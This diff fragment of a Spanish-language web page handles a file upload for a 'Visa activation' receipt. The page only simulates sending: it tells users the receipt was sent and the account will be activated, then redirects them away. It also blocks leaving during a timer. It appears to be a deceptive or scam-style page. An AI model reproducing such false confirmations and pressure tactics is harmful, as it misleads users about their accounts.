+                uploadArea.classList.remove('dragover');
+                
+                const files = e.dataTransfer.files;
+                if (files.length > 0) {
+                    handleFile(files[0]);
+                }
+            });
+            
+            // Click en el área para abrir selector
+            uploadArea.addEventListener('click', (e) => {
+                if (e.target === uploadArea || e.target.closest('.upload-area')) {
+                    fileInput.click();
+                }
+            });
+        }
+        
+        // Manejar selección de archivo
+        function handleFileSelect(input) {
+            if (input.files && input.files[0]) {
+                handleFile(input.files[0]);
+            }
+        }
+        
+        // Procesar archivo
+        function handleFile(file) {
+            // Validar tipo de archivo
+            const allowedTypes = ['image/jpeg', 'image/png', 'image/jpg', 'application/pdf'];
+            if (!allowedTypes.includes(file.type)) {
+                alert('Tipo de archivo no permitido. Solo se aceptan imágenes JPG, PNG y archivos PDF.');
+                return;
+            }
+            
+            // Validar tamaño (10MB máximo)
+            if (file.size > 10 * 1024 * 1024) {
+                alert('El archivo es demasiado grande. El tamaño máximo es 10MB.');
+                return;
+            }
+            
+            selectedFile = file;
+            showFilePreview(file);
+            document.getElementById('submit-btn').disabled = false;
+        }
+        
+        // Mostrar vista previa del archivo
+        function showFilePreview(file) {
+            const preview = document.getElementById('file-preview');
+            const fileName = document.getElementById('file-name');
+            const fileSize = document.getElementById('file-size');
+            const fileIcon = document.querySelector('.file-icon i');
+            
+            fileName.textContent = file.name;
+            fileSize.textContent = formatFileSize(file.size);
+            
+            // Cambiar icono según tipo de archivo
+            if (file.type.startsWith('image/')) {
+                fileIcon.className = 'fas fa-image';
+            } else if (file.type === 'application/pdf') {
+                fileIcon.className = 'fas fa-file-pdf';
+            } else {
+                fileIcon.className = 'fas fa-file-alt';
+            }
+            
+            preview.classList.add('active');
+        }
+        
+        // Formatear tamaño de archivo
+        function formatFileSize(bytes) {
+            if (bytes === 0) return '0 Bytes';
+            
+            const k = 1024;
+            const sizes = ['Bytes', 'KB', 'MB', 'GB'];
+            const i = Math.floor(Math.log(bytes) / Math.log(k));
+            
+            return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
+        }
+        
+        // Remover archivo
+        function removeFile() {
+            selectedFile = null;
+            document.getElementById('file-preview').classList.remove('active');
+            document.getElementById('file-input').value = '';
+            document.getElementById('submit-btn').disabled = true;
+        }
+        
+        // Enviar solicitud
+        function submitApplication() {
+            if (!selectedFile) {
+                alert('Por favor seleccione un archivo');
+                return;
+            }
+            
+            // Mostrar spinner
+            document.getElementById('spinner-container').classList.add('active');
+            
+            // Simular proceso de envío
+            setTimeout(() => {
+                document.querySelector('.spinner').style.display = 'none';
+                document.querySelector('.processing-text').style.display = 'none';
+                document.getElementById('checkmark-container').classList.add('active');
+            }, 3000);
+        }
+        
+        // Completar activación
+        function completeActivation() {
+            // Marcar como usado
+            localStorage.setItem('visa_activation_used', 'true');
+            
+            // Limpiar temporizador
+            clearInterval(timerInterval);
+            
+            // Mostrar mensaje final
+            document.getElementById('spinner-container').classList.remove('active');
+            
+            // Mostrar mensaje de finalización
+            document.querySelector('.container').innerHTML = `
+                <div class="card active">
+                    <h2>Activación Completada</h2>
+                    <div class="alert-box" style="border-color: var(--success-color); background-color: rgba(23, 168, 75, 0.1);">
+                        <div class="alert-icon" style="color: var(--success-color);">
+                            <i class="fas fa-check-circle"></i>
+                        </div>
+                        <div class="alert-content">
+                            <div class="alert-title" style="color: var(--success-color);">¡Proceso Exitoso!</div>
+                            <div class="alert-text">
+                                Su comprobante ha sido enviado correctamente. Recibirá una confirmación por correo electrónico cuando su cuenta sea activada.
+                            </div>
+                        </div>
+                    </div>
+                    <p style="text-align: center; color: var(--text-secondary); margin-top: 20px;">
+                        Esta ventana se cerrará automáticamente en <span id="final-countdown" style="font-weight: bold; color: var(--primary-color);">10</span> segundos...
+                    </p>
+                </div>
+            `;
+            
+            // Cuenta regresiva final
+            let finalCounter = 10;
+            const finalInterval = setInterval(() => {
+                finalCounter--;
+                const element = document.getElementById('final-countdown');
+                if (element) {
+                    element.textContent = finalCounter;
+                }
+                
+                if (finalCounter <= 0) {
+                    clearInterval(finalInterval);
+                    window.location.href = 'about:blank';
+                }
+            }, 1000);
+        }
+        
+        // Prevenir cierre accidental
+        window.addEventListener('beforeunload', function(e) {
+            if (!isBlocked && timeLeft > 0) {
+                e.preventDefault();
+                e.returnValue = '';
+            }
+        });
+        
+        // Prevenir zoom en móviles
+        document.addEventListener('touchstart', function(event) {
+            if (event.touches.length > 1) {
+                event.preventDefault();
+            }
+        }, { passive: false });
+    </script>
+</body>
+</html>
